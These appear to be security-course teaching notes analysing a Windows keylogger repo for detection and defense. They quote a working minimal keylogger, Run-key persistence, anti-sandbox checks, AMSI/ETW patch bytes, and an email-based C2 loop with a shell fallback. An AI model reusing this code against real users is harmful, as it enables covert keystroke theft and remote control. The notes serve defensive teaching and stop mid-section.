# Teaching Notes — Understanding the Keylogger: Architecture, Evolution, and Defense

**Audience:** intermediate security students (comfortable with Python, basic Windows internals)
**Format:** lecture + live code walk + lab
**Repo:** `pykelogger` (Windows / Python 3.8+)
**Prerequisites:** students should have completed a module on Windows processes, registry basics, and network fundamentals.

---

## 0. Ground rules for this module (read aloud, 2 min)

This codebase is studied for **analysis and defense**. Before touching it, establish with the class:

- All execution happens inside **isolated lab VMs** with host-only networking. No lab traffic leaves the VM.
- The students do **not** deploy this onto machines they don't own, and do not test it on family/shared machines.
- Authorization matters: running keylogging software on a machine without the owner's informed consent is illegal in most jurisdictions regardless of how the code is written. Consent-based monitoring (your own device, or an employer/parent scenario with disclosed policy) is a *different legal category* from covert surveillance.
- The learning objective is: **recognize, detect, and remove** this class of tool — and understand the attacker's constraints well enough to predict where it breaks.

Keep this section short and matter-of-fact. It belongs in the module because real incident responders need the legal framing, not as a disclaimer.

---

## 1. Module map — what's actually in this repo (5 min)

The repo is not one program. It's a **teaching progression** plus an **unfinished refactor**. That's a gift for a code-review lesson.

| Layer | File | Role | Wired into main? |
|---|---|---|---|
| Level 0 — hello world | `kky.py` | 13-line `pynput` demo | no |
| Level 1 — monolith | `pykelogger.py` | full pipeline in one file | **yes (entry point)** |
| Level 2 — plugin | `plugins/keylogger.py`, `plugins/__init__.py` | same logic as a `Plugin` class | **no** |
| Level 3 — native hook | `keyhook.py` | raw `SetWindowsHookExW` | **no** |
| Level 4 — native impl | `keylogger.cpp` | C++ `GetAsyncKeyState` + raw SMTP | separate binary |
| Anti-analysis | `antidetect.py` | sandbox/VM/debugger detection | yes |
| Evasion | `evasion.py` | AMSI + ETW patching | **no** |
| C2 | `c2/`, `c2/email.py`, `c2/parser.py` | SMTP send + IMAP command pull | **no** |
| Storage | `storage.py`, `crypto_utils.py` | encrypted local log store | **no** |
| Support | `obfuscation.py`, `log_utils.py`, `config.py` | base64, debug logging, settings | partly |
| Build | `pykelogger.spec` | PyInstaller packaging | — |

**Key point for students:** `evasion.py`, `keyhook.py`, `plugins/`, `storage.py` and `c2/` are all present but **never imported by `pykelogger.py`**. Grep it yourself:

```
grep -r "import evasion\|import keyhook\|from c2\|from storage\|from plugins" *.py
```

→ zero hits from the entry point. This is *dead code written ahead of a refactor that never landed*. It's one of the most common real-world findings in a code audit: **modules that look active but never execute**. Never assume a file does something because it exists.

---

## 2. Level 0 — the 13-line version (5 min)

`kky.py` in its entirety:

```python
import pynput
with open("loog.txt", "w") as log:
    log.write("")

def onpress(key):
    with open("loog.txt", "a") as log:
        log.write(f"{key}\n")

with pynput.keyboard.Listener(on_press=onpress) as listener:
    listener.join()
```

Run this first. Everything else in the repo is an attempt to solve the four problems this file has:

1. **It writes to the current directory** — instantly discoverable, no rotation, no size limit.
2. **It opens/closes the file on every keystroke** — slow, and leaves filesystem telemetry (`FileCreate` per key).
3. **No context** — you get `Key.shift`, not *where* the user was typing.
4. **It dies on reboot, and it's visible** — a console window, an obvious file, no exfiltration.

Have the class list the fixes before you show them. Then reveal the architecture.

---

## 3. The pipeline — startup sequence (10 min)

Walk `pykelogger.py` bottom-up. Line refs are for the current tree.

```
pythonw.exe pykelogger.py
        │
        ├── [module level, runs on import]  pykelogger.py:61-74
        │     ├─ build header: timestamp, username, public IP, private IP
        │     ├─ public IP via GET https://api.ipify.org/      pykelogger.py:65
        │     └─ private IP via socket.gethostbyname()
        │
        └── __main__                                            pykelogger.py:159
              ├─ 1. anti-analysis gate (if ANTIDETECT)          :160-170
              │      antidetect.should_run(cfg) → (safe, score, indicators)
              │      if not safe and EXIT_SILENTLY → fake_exit()
              ├─ 2. establish_persistence()                     :171
              ├─ 3. send_and_restart() → re-arming Timer        :172
              └─ 4. pynput Listener → listener.join()           :173
```

**Two things worth calling out loudly:**

- **Step 0 happens at import time.** The public-IP lookup fires before any condition is evaluated. A network beacon that occurs *unconditionally on process start* is an extremely clean detection signal — there is no "legitimate" reason for a non-browser process to open `api.ipify.org` in its first millisecond.
- **`pythonw.exe`** (decoded from `_PEXE`, `pykelogger.py:29`) — no console window. Combined with `console=False` in the spec, the student-visible symptom list is: *nothing appears to happen*.

---

## 4. The capture layer — three techniques, one class (20 min)

This is the heart of the module. The repo contains **three different keyboard capture mechanisms**. Compare them side by side.

### 4a. `pynput` listener — `pykelogger.py:76-124` (the active one)

```python
def on_press(key):          # :76
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())   # :79
    ...
```

- Event-driven callback per key-down.
- On Windows, `pynput` internally installs a `WH_KEYBOARD_LL` hook — so it's a wrapper, not a different mechanism.
- Getting **window context** is a separate call: `GetForegroundWindow()` + `GetWindowText()` per keystroke.
- Special-key handling via a substitution table (`:85-105`) that maps `Key.enter` → `[ENTER]`, `Key.shift` → `[SHIFT]`, etc.
- Modifier tracking (`pressed_modifiers`, `:74`, `:107-113`) prevents `Key.shift` from being logged repeatedly while held.

### 4b. Raw Win32 hook — `keyhook.py` (orphaned)

```python
_HOOK_HANDLE = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _proc, ...)   # :81
```

Teaching points (this file is the best place to explain *why* hooks work):

- `WH_KEYBOARD_LL = 13` — a **global, low-level** hook. Windows injects the hook DLL/callback into the installing thread's context and delivers events *before* they reach the target window.
- `KBDLLHOOKSTRUCT` (`:18-25`) exposes `vkCode`, `scanCode`, `flags`, `time`, `dwExtraInfo`.
  - `flags` contains **`LLKHF_INJECTED`** — this is how you distinguish synthetic input from hardware input. Great defensive discussion: legitimate automation vs. malware injecting keys.
  - `dwExtraInfo` can carry `LLMHF_*` markers.
- **A message pump is mandatory** (`_message_pump`, `:70-77`). Low-level hooks are dispatched through the message queue; without `GetMessageW`/`TranslateMessage`/`DispatchMessageW` the hook silently never fires. Windows also **silently unhooks callbacks that take too long** (~300 ms) — a classic bug.
- `CallNextHookEx` (`:66`) must be called or you break input for every application on the desktop.
- `_get_key_name` (`:29-53`) uses `GetKeyboardState` + `ToUnicode` to convert a VK code to the correct character **given the current shift/caps state** — this is what makes output readable rather than `0x41`/`0x61` ambiguity.

### 4c. Polling — `keylogger.cpp:447-472`

```cpp
for (int i = 8; i <= 255; i++) {
    if (GetAsyncKeyState(i) & 0x0001) {       // "was it pressed since last call?"
        if (GetAsyncKeyState(i) & 0x8000) {   // "is it down right now?"
            ...
Sleep(10);   // :471
```

Teaching points:

- **Brute-force scan of all 248 VK codes every 10 ms.** CPU cost, and a signature-friendly pattern.
- Bit `0x0001` is the "pressed since last call" flag — it's **cleared on read**, so two consumers polling the same key will steal events from each other.
- The `Sleep(10)` loop means **fast typists lose keystrokes**. A race window of up to 10 ms per scan.
- No key-up events → modifier state has to be re-derived by peeking `GetAsyncKeyState(VK_SHIFT)` (`:183`, `:197`).
- `GetAsyncKeyState` queries the *desktop's* input state, so it captures focus-window input only, and is trivially hooked by EDR at the IAT/EAT.

### Comparison table (put this on the board)

| | `pynput` (active) | `SetWindowsHookExW` | `GetAsyncKeyState` poll |
|---|---|---|---|
| Model | event callback | event callback | state polling |
| Misses keys? | no | no | **yes** (race) |
| Key-up available | yes | yes | no |
| Injected-input marker | indirectly | **`flags` bit** | no |
| CPU cost | low | low | high |
| Needs message pump | hidden inside lib | **yes, explicit** | no |
| Latency | immediate | immediate | ≤10 ms |
| Detection surface | `user32` hook API | same, but visible in your own module | API-call frequency + IAT hooks |

**Demo (5 min):** start `keylogger.cpp` build and `pykelogger.py` in the same VM, type a fast burst of characters, compare the captured output. The dropped characters make the polling trade-off concrete.

---

## 5. Context enrichment — window tracking (5 min)

`pykelogger.py:79-84`:

```python
new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
if new_app == "Cortana":
    new_app = "Windows Start Menu"
if new_app != old_app and new_app != "":
    logged_data += "\n[{0}] ~ {1}: ".format(time.ctime(current_time), new_app)
    old_app = new_app
```

Why this matters far more than the keystrokes themselves:

- Raw keystrokes are ambiguous (`abc123` = anything). **Window title + keystrokes = context**, which is what makes captured data actually useful (password field position, application, document name).
- The output format is:
  ```
  [START OF LOGS]
    *~ Date/Time: ...
    *~ User-Profile: ...
    *~ Public-IP: ...
    *~ Private-IP: ...

  [Wed Oct 07 12:00:01 2026] ~ Gmail - Chromium:
  mypassword[ENTER]
  [Wed Oct 07 12:00:09 2026] ~ Documents\payroll.xlsx - Excel:
  ...
  ```
- **Defensive corollary:** this log format *is* your IOC. The `[{timestamp}] ~ {window}: ` pattern and the `[START OF LOGS]` banner are stable, distinctive strings — ideal for YARA and for hunting in any archived log store.
- The Cortana special-case (`:80-81`) is a nice detail: the raw title of the Start menu search is unhelpful, so it's normalized. Attacker UX polish.

---

## 6. Buffering and exfiltration (15 min)

### 6a. The buffer

`logged_data` is a **single global string** (`:71`) appended to by the listener thread (`:83`, `:111`, `:118`) and reset by the timer thread (`:151`).

> **Discussion prompt:** `on_press` runs on the pynput listener thread; `send_email` runs on the `threading.Timer` thread. Both mutate `logged_data` with no lock. What happens if a key arrives between `send_email`'s read and its reset?
>
> **Answer:** the keystroke is **silently discarded**. String concatenation + read/reset across threads with no synchronization is a data-loss bug. Students should be able to name the fix (a `queue.Queue`, or a lock, or swapping buffers atomically).

### 6b. The timer

`send_and_restart()` (`:126-130`) re-arms a `threading.Timer` every `SEND_INTERVAL` seconds (default 120).

- It's not a `while True` loop — it's **self-rearming**, so a failure inside `send_email` doesn't kill the loop.
- Note `timer = None` at `:131` / `:134` — sloppy re-entrancy handling, but the pattern is worth teaching: *jittered, periodic, in-process exfiltration*.

### 6c. The SMTP path

`send_email()` (`:132-157`):

- Builds a `MIMEMultipart` with subject `{user} - {timestamp}` (decoded `_ESUB`).
- `smtplib.SMTP_SSL("smtp.gmail.com", 465)` → `login` → `sendmail`.
- **3 retries**, 5-second sleep between.
- On success, resets buffer to `initial_msg` (`:151`).
- On failure after 3 retries → `backup_to_file()` (`:157`).

**Why this is the single best network IOC in the whole project:**

> A process that is **not an email client** opening **TCP/465 to `smtp.gmail.com`** is anomalous by definition. Consumer mail relays should only see connections from Outlook/Thunderbird/phone mail apps. Same for recurring **IMAP (TCP/993) polls** from `pythonw.exe`.
>
> Also note: `api.ipify.org` on process start, every run, unconditionally.

### 6d. The fallback — local encrypted backup

`backup_to_file()` (`:52-59`) + `simple_encrypt()` (`:35-39`):

```python
def simple_encrypt(data):
    if not config.ENCRYPT_LOGS: return data
    key = config.ENCRYPTION_KEY
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
```

- XOR with a **repeating key from `config.py`** (`ENCRYPTION_KEY`).
- Written to `%APPDATA%\data_cache.tmp` (`LOG_FILE_NAME`) with `---END OF CHUNK---` delimiters.
- **Teaching point:** repeating-key XOR is broken by frequency analysis and trivially by known-plaintext (you *know* the header starts with `[START OF LOGS]`). It's obfuscation, not confidentiality.

The newer `storage.py` replaces this with a real scheme — see §8.

---

## 7. Anti-analysis — `antidetect.py` (20 min)

Called at `pykelogger.py:160-170`. The gate is **scored, not all-or-nothing**: each check returns a boolean indicator, and the run proceeds only if `score < THREAT_THRESHOLD` (default 2).

```python
def should_run(cfg):
    score, indicators = _run(cfg)
    return score < cfg.get("threat_threshold", 2), score, indicators
```

Walk each check — students should be able to explain *what an analyst is doing that this defeats*, and *what the check actually measures*.

### Debugger checks

| fn | Technique | What it reads |
|---|---|---|
| `_0` `:14` | `kernel32.IsDebuggerPresent()` | PEB `BeingDebugged` flag |
| `_1` `:17` | `NtQueryInformationProcess` class 0 → read PEB byte at offset +2 | same flag, but via ntdll — bypasses the first-layer API hook |
| `_2` `:35` | `GetThreadContext` → `DR0`–`DR3` | hardware breakpoint registers |

**Teaching point:** `_0` is defeated by any tool that clears the flag; `_1` reads the *same memory* through a different API; `_2` catches hardware BPs that leave no PEB trace. This is an escalation ladder — show students that each layer exists to catch the previous layer's bypass.

### Timing check

```python
def _3():                                   # :48
    s = time.perf_counter()
    time.sleep(1.5)
    return time.perf_counter() - s < 1.0
```

Sleeps 1.5 s; if it returned in under 1.0 s, someone accelerated time. **Classic sandbox detection.** Discuss the arms race: sandbox authors fake `Sleep`, malware authors time `rdtsc`/`QueryPerformanceCounter` around other calls, and so on.

### VM detection

- `_4` `:53` — MAC address OUI lookup against known hypervisor prefixes (VMware `00:0C:29`, VirtualBox `08:00:27`, Hyper-V `00:15:5D`, QEMU `52:54:00`…).
- `_5` `:63` — registry keys: `VMware, Inc.\VMware Tools`, `Oracle\VirtualBox Guest Additions`, `VBoxGuest`, `VBoxMouse`, `VBoxSF`, `VBoxVideo`, `harddisk\scsi\...`.
- `_6` `:83` — driver files: `vmmouse.sys`, `vmhgfs.sys`, `VBoxGuest.sys`, `vmmouse.sys`, `vmxnet.sys`, `vboxguest`… via `os.path.isfile`.
- `_7` `:94` — process names: `vmtoolsd.exe`, `vmwaretray.exe`, `vmwareuser.exe`, `VBoxTray.exe`, `VBoxCtrl.exe` — via `CreateToolhelp32Snapshot` + `Process32FirstW/NextW` (`:103-128`).

### Sandbox heuristics

- `_8` `:133` — RAM < 2 GB **or** free disk < 60 GB. (`GlobalMemoryStatusEx`, `GetDiskFreeSpaceExW`)
- `_9` `:157` — username in `{admin, user, sandbox, virus, malware, test, demo, lab, analysis, sample}`.
- `_10` `:164` — screen smaller than 1024×768 (`GetSystemMetrics`).

### The deceptive exit

```python
def fake_exit():                                        # :192
    with open(os.path.join(TEMP, "wuaesess.log"), "w") as f:
        f.write("")
    sys.exit(0)
```

Decoded name: **`wuaesess.log`** — mimics *Windows Update Agent Session*. The process exits **without any error dialog**, and leaves a plausible-looking empty file so an analyst who greps `%TEMP%` sees "evidence" the program started and did something benign.

**Discussion prompt:** how would you tell the real thing apart?
> Answer: `wuaesess.log` is not a real Windows artifact. `%TEMP%` files with that name, created at run time by a non-`svchost` process, are a signal. More robustly: the *absence* of the expected next-stage behavior after a short-lived process is itself observable — correlate process start with network/registry activity that never happened.

### Opinions to solicit from students

- Threshold of 2 means **two coincidental flags** (e.g. a low-RAM laptop with a 1366×768 screen, or a VM user named `admin`) cause a silent exit. What's the false-positive cost to a real attacker?
- What does silent failure look like to *you* when you're the analyst? (Answer: "it didn't work" — the most confusing class of incident.)

---

## 8. Persistence (5 min)

`establish_persistence()`, `pykelogger.py:41-50`:

```python
path = os.path.realpath(__file__)
key = winreg.OpenKey(HKEY_CURRENT_USER,
                     "Software\Microsoft\Windows\CurrentVersion\Run", ...)
winreg.SetValueEx(key, "WindowsUpdateClient", 0, REG_SZ, pythonw.exe "{path}")
```

Decoded:
- **Key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value name:** `WindowsUpdateClient` — impersonates Windows Update
- **Command:** `pythonw.exe "<absolute path>"`

Teaching points:

1. **`HKCU`, not `HKLM`** — no admin rights required. This is the standard choice for user-context malware and it's why a UAC prompt never appears.
2. **Masquerading value name** — `Autoruns` and Sysmon Event ID 13 will show `WindowsUpdateClient` pointing at `pythonw.exe`. Teach students to compare the *command* against the *name*, not just read the name.
3. **This is broken in the packaged build — a great bug-hunt exercise.**
   - `os.path.realpath(__file__)` in a PyInstaller one-file bundle resolves into `%TEMP%\_MEIxxxxxx\`, which is **deleted when the process exits**.
   - The Run key therefore points at a path that doesn't exist on the next boot.
   - **Ask the class to find this before telling them.** Then show them: `pykelogger.spec:32` has `runtime_tmpdir=None` (one-file mode), and `datas=[('config.py', ...)]` (`:7`) extracts `config.py` next to the payload at runtime — so the *config file exists only while running*, and the Run key survives while the target does not.
4. **Detection:** Sysmon Event ID 13 (`RegistryValueSet`) under `...\CurrentVersion\Run`, `Event ID 4657` in the Security log, or just an `Autoruns` baseline diff. The value name gives no protection.

---

## 9. Obfuscation — `obfuscation.py` and its limits (10 min)

The whole module is four lines:

```python
def obf(s):  return base64.b64encode(s.encode()).decode()
def deobf(s): return base64.b64decode(s).decode()
```

Every sensitive string is stored base64-encoded and decoded at runtime: `smtp.gmail.com`, `Software\...\Run`, `WindowsUpdateClient`, `pythonw.exe "{}"`, `api.ipify.org`, `amsi.dll`… (see `pykelogger.py:22-29`, `antidetect.py` throughout).

**Exercise (do this live, it's the most valuable 5 minutes in the module):**

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("c210cC5nbWFpbC5jb20="))
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"))
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("V2luZG93c1VwZGF0ZUNsaWVudA=="))
```
→ `smtp.gmail.com` / `Software\Microsoft\Windows\CurrentVersion\Run` / `WindowsUpdateClient`

**What to drive home:**

- Base64 is an **encoding, not encryption**. No key, no work factor, `base64 -d` defeats it.
- It defeats only **lazy static matching** — a YARA rule written as `strings: $a = "smtp.gmail.com"` fails. The same rule written as `$a = "c210cC5nbWFpbC5jb20="` succeeds.
- Real AV/EDR unpacks, emulates, or just hooks the *decoded* API call (`smtplib.SMTP_SSL` with host `smtp.gmail.com`), so the string never needs to appear on disk.
- **Therefore:** obfuscation raises the bar for *signature authors*, not for *products*. The README's claim ("evade static AV signatures") is technically true and practically weak — say so.
- Cost/benefit: obfuscation makes *your own* code unreadable, breaks grepping, and adds a maintenance tax. Note how much of this file's volume is `deobf(...)` noise.

---

## 10. Crypto and storage — `crypto_utils.py` / `storage.py` (15 min)

The newer path (used only by the orphaned `plugins/keylogger.py`):

- `derive_key()` (`crypto_utils.py:18`) — PBKDF2-HMAC-SHA256, **600,000 iterations**, salt `"keylogger_v1"`.
- `encrypt()` (`:41`) — Fernet (AES-128-CBC + HMAC) when `cryptography` is installed.
- `storage.py` — JSON-lines `{"ts": ..., "data": ...}`, one encrypted blob per line, appended to `%APPDATA%\keylogger_store\<tag>.log`.
- `_auto_rotate()` (`storage.py:97`) — at 5 MB, gzip to `<tag>.1.gz` and shift up to `<tag>.5.gz`.

This is genuinely competent design. Now find the flaws — this is the best code-review exercise in the repo:

| # | Flaw | Line | Why it matters |
|---|---|---|---|
| 1 | Salt is a **static constant** `b"keylogger_v1"` | `crypto_utils.py:14` | PBKDF2's salt defeats rainbow tables *per unique salt*. A fixed salt means every deployment shares one precomputation. |
| 2 | The key is `config.ENCRYPTION_KEY = 'change-this-to-a-random-string'` and ships **inside the same payload** | `config.py:9` | Encryption with a key the adversary already has. Forensically: recovering the key from the binary decrypts every stored log. |
| 3 | **Silent algorithm downgrade** | `crypto_utils.py:22-28, 47` | If `cryptography` isn't installed, `derive_key` returns `password.ljust(32, b"\0")` and `encrypt` falls back to **base64**. No warning, no failure — the student thinks it's encrypted. This is the single most instructive bug in the repo. |
| 4 | `_KEY_CACHE` / `_FERNET_CACHE` hold derived keys in process memory | `:15, :32` | A memory dump or `procdump` recovers them. |
| 5 | Debug log at `%TEMP%\keylogger_logs\debug.log` | `log_utils.py:5-6` | The tool **writes its own forensic trail**, including `"ETW patched"`, `"AMSI patched"`, `"WH_KEYBOARD_LL hook installed"`. Free evidence. |
| 6 | Legacy XOR path still present alongside AES | `pykelogger.py:35-39` | Two crypto implementations, one weak, one not — which runs depends on which file you execute. |
| 7 | Rotation keeps archives readable | `storage.py:114` | `.1.gz`–`.5.gz` are gzip only — compression, not protection. |

**Prompt for students:** *"The adversary encrypted their own loot with a key they embedded in the loot container. Does the encryption help them, or help you?"*
> Answer: it helps **them** against casual inspection (a user who finds `data_cache.tmp` sees garbage and ignores it) and hurts **them** against a real responder (who extracts the key and reads everything). Encryption at rest protects against the wrong party here.

---

## 11. The C2 channel — `c2/` (15 min)

Also unwired, but the most important design discussion in the repo.

`c2/email.py` implements `C2Channel` with **two directions**:

- **`send()`** (`:65`) — SMTP exfiltration, as in §6c, plus `backup_to_file` on failure.
- **`receive()`** (`:98`) — this is new and significant:

```python
mail = imaplib.IMAP4_SSL("imap.gmail.com")
mail.login(...)
mail.select("INBOX")
cmd_subject = "[CMD]"                                   # :104
status, messages = mail.search(None, "UNSEEN", f'SUBJECT "{cmd_subject}"')
...
commands.extend(parse_command(body.strip()))            # :120
mail.store(mid, "+FLAGS", "\\Deleted")                  # :121   ← consumes the command
mail.expunge()
```

`c2/parser.py`:

```python
_KNOWN_ACTIONS = {"keylogger", "selfdestruct", "sysinfo"}   # :1
...
if action in _KNOWN_ACTIONS: ...
else:
    return [{"action": "shell", "args": [body]}]            # :25
```

**What this turns the tool into:**

| Capability | Meaning |
|---|---|
| `[CMD]` subject + `UNSEEN` search | operator sends mail to the attacker's own inbox; the implant polls and executes |
| `+FLAGS \Deleted` + `expunge` | **one-shot commands** — consumed on read, so retries and audits are impossible |
| `selfdestruct` | remote uninstall / evidence removal |
| `sysinfo` | host reconnaissance |
| **`shell <anything>` fallback** | **arbitrary command execution** |

> A keylogger with a shell fallback is no longer a keylogger. It's a **RAT with a keystroke module**. Say this explicitly — it changes the classification, the severity, and the response.

**Security flaws to draw out (defense-relevant, and a good threat-modeling discussion):**

1. **No command authentication.** Authorization is "a message appeared in my inbox with subject `[CMD]`". Compromise the mailbox (or spoof mail into it) and you own the implant. There is no signing, no nonce, no replay protection.
2. **`UNSEEN` + delete means no audit trail.** The operator can't verify delivery; the responder can't see a reliable command history once it's expunged.
3. **Consumer email as C2 is a loud signal.** Recurring `imap.gmail.com:993` from `pythonw.exe` at a regular cadence is textbook beaconing — even if the content is encrypted.
4. **The credentials are the crown jewels.** `config.py` holds a Gmail app password, bundled as a *data file* in the exe (`pykelogger.spec:7`). Anyone who extracts the payload gets the operator's mailbox — and therefore the entire command history *and* the ability to issue new commands.
5. **No jitter, fixed 120 s interval** → perfectly periodic traffic, trivially caught by beacon/anomaly detection.

---

## 12. Evasion module — `evasion.py` (10 min)

Present in the repo, **never called**. Explain it anyway: students will meet it in the wild.

### What it does

```python
def patch_etw():    # :35
    # ntdll!EtwEventWrite  →  0xC3 (RET)

def patch_amsi():   # :46
    # amsi!AmsiScanBuffer  →  0x33 0xC0 0xC3 (XOR EAX,EAX; RET)
```

via `_patch_function()` (`:18`): `GetProcAddress` → `VirtualProtect(PAGE_EXECUTE_READWRITE)` → overwrite → restore protection.

Also present: `direct_ntqueryinfo`, `direct_ntallocatevirtualmemory`, `direct_ntprotectvirtualmemory` (`:67-126`) — resolving ntdll syscalls via `ctypes.WINFUNCTYPE` instead of going through the Win32 API layer.

### Concepts to cover

- **ETW (`Event Tracing for Windows`)** — Windows' in-kernel telemetry pipeline. `EtwEventWrite` is the function that actually flushes events. Patching it to immediately `RET` makes the process's user-mode ETW providers emit nothing. This blinds a large class of host telemetry.
- **AMSI (`Antimalware Scan Interface`)** — PowerShell/Scripting Host/VBA content is handed to `AmsiScanBuffer` for inspection. Returning `AMSI_RESULT_CLEAN` (`0`) unconditionally makes every scanned buffer "clean."
- **Why direct ntdll calls matter** — EDR commonly hooks the Win32 layer (`VirtualProtectEx`, `WriteProcessMemory`). Calling the underlying syscall via `NtProtectVirtualMemory` skips the hook. This is the "unhooking / direct syscall" family of techniques.

### Defensive countermeasures — this is the payoff

Students should leave able to answer *"how do you catch this?"*:

| Technique | Detection |
|---|---|
| `EtwEventWrite` → `RET` | Compare mapped `ntdll.dll` `.text` against on-disk image (tamper check); kernel-side ETW providers that don't depend on the user-mode flush; **the patch bytes `\xC3` at the function entry are a signature** |
| `AmsiScanBuffer` → `XOR EAX,EAX;RET` | Same image-integrity check on `amsi.dll`; signature on `\x33\xC0\xC3`; AMSI itself is only one layer — Cmd/PowerShell transcription and script-block logging (`Event 4104`) operate elsewhere |
| `VirtualProtect` → RWX → restore | Sysmon/EDR alert on `PAGE_EXECUTE_READWRITE` transitions on any DLL-backed region, especially right after `LoadLibrary` |
| Direct syscalls | Absence of a hook where one is expected; anomalous `syscall` instruction sites; ETW kernel-mode `Threat Intelligence` GUID telemetry that user-mode patching can't reach |

**Also worth noting:** this module writes `log("info", "ETW patched (EtwEventWrite → RET)")` to `%TEMP%\keylogger_logs\debug.log` via `log_utils.py`. **The tool logs its own successful evasion.** Wonderful irony to end the section on.

---

## 13. Packaging — `pykelogger.spec` (5 min)

```python
datas=[('config.py', '.'), ('antidetect.py', '.'), ('obfuscation.py', '.')]   # :7
...
strip=True        # :28
upx=False         # :30
console=False     # :31
optimize=2        # :15
```

- **`console=False`** — no window at all under `pythonw`.
- **`upx=False`** — the comment in the README is right and counterintuitive: UPX is so widely flagged by AV that *not* packing is quieter than packing. Good "assumptions get you caught" moment.
- **`strip=True`, `optimize=2`** — remove symbols/bytecode; shrinks the string table.
- **`datas` bundles `config.py` as plaintext** — the Gmail app password ships *inside the exe*, extractable. This is flaw #4 from §11 and it's a packaging decision, not a crypto one.
- **`one-file` mode** (`runtime_tmpdir=None`) — the payload self-extracts to `%TEMP%\_MEIxxxxxx\` on every run. That directory name is a **stable, high-signal IOC**.
- The README already concedes the point: *"will be flagged by some AVs regardless of obfuscation — this is inherent to keylogging software."* Use that as a discussion springboard about **why** — it's behavior, not strings, that gets it caught.

---

## 14. Where this project would go next — and what each step costs (20 min)

> **Framing for the class:** the exercise here is *purple-team prediction*. For each natural next step, name the improvement **and** the new detection surface it opens. An attacker's roadmap is a defender's checklist. Don't write any of this — reason about it.

### 14a. Capture fidelity
**Direction:** add key-up events, correct modifier-state reconstruction, clipboard capture, screenshot capture, browser/form-field context via UI Automation.
**Cost:** more APIs per keystroke → higher hook latency; `GetClipboardData`/`OpenClipboard` and screenshot calls (`BitBlt`, `PrintWindow`) are heavily instrumented; UI Automation traffic is a distinctive, low-volume signature.

### 14b. Architecture — finish the plugin refactor
**Direction:** `plugins/__init__.py` defines the abstract `Plugin` (`start`/`stop`/`poll`/`handle_command`); a host would enumerate plugins and dispatch `poll()` into `C2Channel.send()`. Add collectors as new plugins.
**Cost:** a plugin directory on disk (`%APPDATA%\...\plugins\`), a registry of loaded modules, and a stable loading pattern that's easy to write a filesystem/behavior rule against. The current repo is *mid-refactor* — a great case study in how refactors create detection windows.

### 14c. C2 modernization
**Direction:** replace consumer email with HTTPS/DNS-based channels, use legitimate-looking domains and CDNs, add per-host identifiers, jitter and randomize intervals, dead-drop in a plausible cloud store.
**Cost:** now you need network analytics instead of a firewall rule. Look for: beacon periodicity (entropy of inter-arrival times), JA3/JA3S fingerprints, domains with low Alexa/Tranco rank and recent registration, DNS query volume anomalies, HTTP requests whose body size is asymmetric to the response.

### 14d. Persistence hardening
**Direction:** fix the broken `Run` key, then add redundant mechanisms — Scheduled Tasks, WMI event subscriptions, services, COM hijack, Startup folder, `.lnk` in Startup, `Userinit`/`Shell` values.
**Cost:** more places to look, but every one is **covered by Autoruns and Sysmon**. Key events: **1** (process create), **12/13** (registry object create/value set), **11** (file create). A maintained baseline makes all of them visible.

### 14e. Stealth / process execution
**Direction:** inject into a signed, always-running host process; fileless in-memory execution; masquerade as a trusted binary name/path; inherit a trusted parent.
**Cost:** EDR's highest-signal alerts live here — **unsigned/`unbacked` module loaded into a signed process (Sysmon 7)**, RWX allocation followed by a thread start, parent-child anomalies, image-path vs. actual-binary mismatches.

### 14f. Reliability and operational security
**Direction:** encrypted config with key escrow, integrity self-checks, crash recovery, a watchdog that resurrects the process, randomized send intervals.
**Cost:** a respawning process is *more* visible than a single one. Watch for: a short-lived process repeatedly re-launched by `explorer.exe`/`svchost.exe`, and second-stage children with no user interaction.

### 14g. Packaging and delivery
**Direction:** code signing, custom loaders, droppers.
**Cost:** signing is the expensive one. Signature anomalies (cert valid but never seen before, issued to a name that doesn't match the publisher), high-entropy unpacking stubs, and the drop-then-execute sequence (Sysmon 1 → 11 → 1 with a short delta) are all mature detections.

**Class exercise:** pick two of the above, and write one concrete detection hypothesis for each in the form
> *"If the adversary does **X**, we expect to observe **Y** in **source Z** within **T**."*

---

## 15. How this gets onto a target machine (20 min)

> **Scope note for this section:** covered at the *threat-model* level — the initial-access taxonomy, why each vector works, what the payload must satisfy to succeed, and the control that stops it. Crafting lures, writing phishing content, or producing a working delivery package is out of scope for this module; those belong in a social-engineering/phishing-awareness module taught under its own rules.
>
> Framing the section this way keeps it useful for defenders, which is the actual job skill.

Map everything to **MITRE ATT&CK** so students can carry it into their tooling.

### The vectors

| Vector | ATT&CK | Why it works | Payload must satisfy | Primary control |
|---|---|---|---|---|
| **Malicious attachment** — document, ISO/IMG, OneNote, HTML smuggling | T1566.001 | user opens a file they were told to open | survive Mark-of-the-Web; run in **user context** (no admin needed for `HKCU\...\Run`); no console | ASR rules, MOTW enforcement, macro policy, sandbox attachments |
| **Malicious link** | T1566.002 | user clicks through to a download | same as above | URL filtering, secure web gateway, browser download policy |
| **Trojanized / pirated software, "cracks", "cheats"** | T1204.002 | **the user is actively trying to bypass security** — they'll click through warnings | look plausible; bundle with a legitimate installer | application allowlisting, block unknown publishers, user training |
| **Bundled with legitimate software** | T1195.001 | installed alongside something wanted | survive an installer sequence the user expects | verify publisher signatures, prefer official sources |
| **Drive-by download / compromised site** | T1189 | no interaction beyond browsing | exploit or trick the browser into a download | patch browsers, isolate risky browsing |
| **Removable media** | T1091 | air-gapped or limited-network hosts | autorun-independent execution | disable autorun, block unknown USB, host firewall |
| **Exploitation of an exposed service** (RDP, SMB, exposed app) | T1190 | reachable and unpatched | **this one often needs privilege escalation** — the payload must go further than the user context | MFA on RDP, network segmentation, patching |
| **Compromised software supply chain / fake update** | T1195.002 | trust is inherited from a real vendor | fit the update mechanism's shape | vendor integrity verification, EDR on updater children |
| **Disclosed/consented installation** (parental or employee monitoring, MDM) | — | *not an intrusion* — it's policy | transparency and a documented acceptable-use policy | **policy and consent, not technical control** |

### The three things every delivery path has in common

Teach these as the generalization, so students aren't memorizing a list:

